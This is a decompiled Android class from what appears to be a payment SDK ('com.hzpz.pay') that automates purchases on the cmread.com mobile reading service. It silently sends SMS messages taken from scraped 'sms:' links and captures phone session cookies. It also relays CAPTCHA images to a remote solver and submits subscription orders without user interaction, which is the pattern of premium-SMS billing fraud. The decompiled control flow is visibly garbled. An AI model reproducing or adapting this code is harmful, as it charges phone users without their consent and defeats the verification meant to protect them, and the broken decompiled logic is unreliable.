package com.hzpz.pay;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.SmsManager;
import android.text.TextUtils;
import com.hzpz.pay.jsoup.Connection;
import com.hzpz.pay.jsoup.Connection.Response;
import com.hzpz.pay.jsoup.Jsoup;
import com.hzpz.pay.jsoup.UnsupportedMimeTypeException;
import com.hzpz.pay.jsoup.nodes.Document;
import com.hzpz.pay.jsoup.nodes.Element;
import com.hzpz.pay.jsoup.select.Elements;
import java.io.IOException;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

final class bz
  implements Runnable
{
  bz(by paramBy, Q paramQ, boolean paramBoolean, U paramU) {}
  
  public final void run()
  {
    Object localObject1 = null;
    Object localObject4 = null;
    Object localObject7 = null;
    Object localObject10;
    Object localObject11;
    Connection localConnection;
    label339:
    label412:
    do
    {
      try
      {
        localObject9 = this.a.a.l;
        localObject10 = this.b;
        localObject11 = String.format("http://wap.cmread.com/r/%s/%s.htm?cm=%s", new Object[] { ((Q)localObject10).d, ((Q)localObject10).e, ((Q)localObject10).c });
        localObject10 = ((Context)localObject9).getSharedPreferences("cmk", 0);
        Iterator localIterator;
        localObject11 = (Element)localIterator.next();
      }
      catch (aT localAT)
      {
        try
        {
          localConnection = Jsoup.a((String)localObject11).b(false);
          localConnection.a("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
          localConnection.a("User-Agent", "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-cn; MI 2SC Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/2.1.1");
          localConnection.a("Accept-Encoding", "gzip, deflate");
          localConnection.a("Accept-Language", "zh-CN,en-US;q=0.8");
          localConnection.a("X-Org-Request", "1");
          localConnection.a(60000);
          if ((((SharedPreferences)localObject10).contains("imsi")) && (((SharedPreferences)localObject10).getString("imsi", "-").equals(PzPay.r)) && ("wifi".equals(az.b))) {
            localConnection.b(((SharedPreferences)localObject10).getAll());
          }
          localObject9 = localConnection.a();
          localIterator = ((Document)localObject9).a("a").iterator();
          if (localIterator.hasNext()) {
            break label339;
          }
          localObject10 = null;
          localObject1 = null;
          localObject4 = localObject7;
          localObject7 = localObject10;
          if (localObject1 == null) {
            break label1469;
          }
          localObject9 = localObject1;
          if (TextUtils.isEmpty((CharSequence)localObject4)) {
            break label1262;
          }
          if (!TextUtils.isEmpty((CharSequence)localObject7)) {
            break;
          }
          throw new aT(6, (String)localObject4);
        }
        catch (Exception localException1)
        {
          throw new aT(4, (String)localObject11);
        }
        localAT = localAT;
        this.a.a.l.runOnUiThread(new ca(this, this.c, localAT, this.b, this.d));
        return;
      }
      if ((((Element)localObject11).d("href") != null) && (((Element)localObject11).d("href").startsWith("/r/u/purchase.jsp")))
      {
        localObject10 = "http://wap.cmread.com" + ((Element)localObject11).d("href");
        localObject4 = ((Document)localObject9).a("img").iterator();
        if (!((Iterator)localObject4).hasNext())
        {
          localObject7 = null;
          localObject4 = localException1;
          localObject2 = localObject7;
        }
        for (;;)
        {
          localConnection.a("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
          localObject7 = localObject10;
          localObject10 = localObject2;
          localObject2 = localObject7;
          localObject7 = localObject10;
          break;
          localObject7 = (Element)((Iterator)localObject4).next();
          if ((((Element)localObject7).d("src") == null) || (!((Element)localObject7).d("src").startsWith("/r/vs/avi"))) {
            break label412;
          }
          localObject2 = "http://wap.cmread.com" + ((Element)localObject7).d("src");
          try
          {
            aP.b("验证码" + (String)localObject2);
            localConnection.a((String)localObject2);
            localConnection.a(true);
            localConnection.c();
            localObject4 = aO.a(localConnection.d().f());
            localObject7 = localObject2;
            localObject2 = localObject4;
            localObject4 = localObject7;
          }
          catch (Exception localException3)
          {
            if ((localException3 instanceof UnsupportedMimeTypeException)) {
              break label1620;
            }
          }
        }
        throw new aT(6, (String)localObject2);
      }
    } while ((((Element)localObject11).d("href") == null) || (!((Element)localObject11).d("href").startsWith("sms:")));
    Object localObject2 = ((Element)localObject11).d("href");
    localObject7 = ((String)localObject2).substring(4, ((String)localObject2).indexOf("?"));
    Object localObject9 = ((String)localObject2).substring(((String)localObject2).indexOf("body=") + 5, ((String)localObject2).length());
    localObject2 = ((Element)localObject11).d("onclick");
    localObject2 = "http://wap.cmread.com" + ((String)localObject2).substring(4, ((String)localObject2).length() - 2);
    for (;;)
    {
      try
      {
        SmsManager.getDefault().sendTextMessage((String)localObject7, null, (String)localObject9, null, null);
      }
      catch (IllegalArgumentException localIllegalArgumentException)
      {
        try
        {
          Thread.sleep(10000L);
          try
          {
            aP.b("登录验证");
            localObject9 = localConnection.a((String)localObject2).a();
            localObject2 = localConnection.d().d();
            if (((Map)localObject2).containsKey("userPhoneToken"))
            {
              aP.b("获取到Cookie");
              localObject7 = ((SharedPreferences)localObject10).edit();
              localObject10 = ((Map)localObject2).keySet().iterator();
              if (((Iterator)localObject10).hasNext()) {
                break label948;
              }
              ((SharedPreferences.Editor)localObject7).putString("imsi", PzPay.r);
              ((SharedPreferences.Editor)localObject7).commit();
            }
            localObject2 = ((Document)localObject9).a("a").iterator();
            if (((Iterator)localObject2).hasNext()) {
              break label984;
            }
            localObject7 = null;
            localObject2 = ((Document)localObject9).a("img").iterator();
            if (((Iterator)localObject2).hasNext()) {
              break label1068;
            }
            localObject2 = null;
            label887:
            localConnection.a("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
            localObject10 = localObject2;
            localObject2 = localObject7;
            localObject7 = localObject10;
          }
          catch (Exception localException4)
          {
            throw new aT(4, (String)localObject2);
          }
          localIllegalArgumentException = localIllegalArgumentException;
          aP.c("TAG", "发送短信出错");
          continue;
        }
        catch (InterruptedException localInterruptedException)
        {
          localInterruptedException.printStackTrace();
          continue;
        }
      }
      label948:
      localObject11 = (String)((Iterator)localObject10).next();
      localInterruptedException.putString((String)localObject11, (String)((Map)localObject2).get(localObject11));
      continue;
      label984:
      localObject8 = (Element)((Iterator)localObject2).next();
      if ((((Element)localObject8).d("href") != null) && (((Element)localObject8).d("href").startsWith("/r/u/purchase.jsp")))
      {
        localObject8 = "http://wap.cmread.com" + ((Element)localObject8).d("href");
        aP.b("订购地址" + (String)localObject8);
        continue;
        label1068:
        localObject10 = (Element)((Iterator)localObject2).next();
        if ((((Element)localObject10).d("src") != null) && (((Element)localObject10).d("src").startsWith("/r/vs/avi")))
        {
          localObject2 = "http://wap.cmread.com" + ((Element)localObject10).d("src");
          try
          {
            localConnection.a((String)localObject2);
            localConnection.a(true);
            localConnection.c();
            Object localObject5 = aO.a(localConnection.d().f());
            localObject10 = localObject2;
            localObject2 = localObject5;
            localObject5 = localObject10;
          }
          catch (IOException localIOException)
          {
            if ((localIOException instanceof UnsupportedMimeTypeException)) {
              break label1608;
            }
          }
        }
      }
    }
    throw new aT(6, (String)localObject2);
    Object localObject8 = Y.a(new ao().a((String)localObject8));
    if ((localObject8 != null) && ("1".equals(((Y)localObject8).a)))
    {
      localObject9 = ((String)localObject2).split("&");
      int j = localObject9.length;
      i = 0;
      label1254:
      if (i >= j) {
        localObject9 = localObject2;
      }
    }
    for (;;)
    {
      try
      {
        label1262:
        aP.b("订购" + (String)localObject9);
        localObject2 = localConnection.a((String)localObject9).a();
        localObject2 = ((Document)localObject2).b().toString();
        if (!((String)localObject2).contains("read_content")) {
          break;
        }
        aP.b("订购成功");
        throw new aT(1, (String)localObject2);
      }
      catch (Exception localException2)
      {
        throw new aT(4, (String)localObject9);
      }
      localObject10 = localObject9[i];
      if (!((String)localObject10).contains("verifyCode")) {
        break label1632;
      }
      localObject9 = ((String)localObject2).replace((CharSequence)localObject10, "verifyCode=" + ((Y)localObject8).b);
      continue;
      throw new aT(10, "请求服务端验证码结果失败！");
    }
    aP.b((String)localObject9);
    aP.b("订购失败" + localException2);
    if (localException2.contains("余额不足")) {
      throw new aT(5, localException2);
    }
    if (localIOException != null) {}
    for (int i = 7;; i = 8)
    {
      throw new aT(i, localException2);
      label1469:
      if (localObject9 != null)
      {
        localObject3 = ((Document)localObject9).b().toString();
        if ((((String)localObject3).contains("登录")) || (((String)localObject3).contains("用户名")) || (((String)localObject3).contains("密码")))
        {
          aP.b("要登录");
          throw new aT(3, (String)localObject3);
        }
        if (((String)localObject3).contains("read_content"))
        {
          aP.b("已订购");
          throw new aT(2, (String)localObject3);
        }
      }
      aP.b("未知" + localObject9);
      if (localObject9 != null) {}
      for (Object localObject3 = ((Document)localObject9).b().toString();; localObject3 = "未知") {
        throw new aT(9, (String)localObject3);
      }
      label1608:
      localObject10 = null;
      Object localObject6 = localObject3;
      localObject3 = localObject10;
      break label887;
      label1620:
      localObject8 = null;
      localObject6 = localObject3;
      localObject3 = localObject8;
      break;
      label1632:
      i += 1;
      break label1254;
    }
  }
}
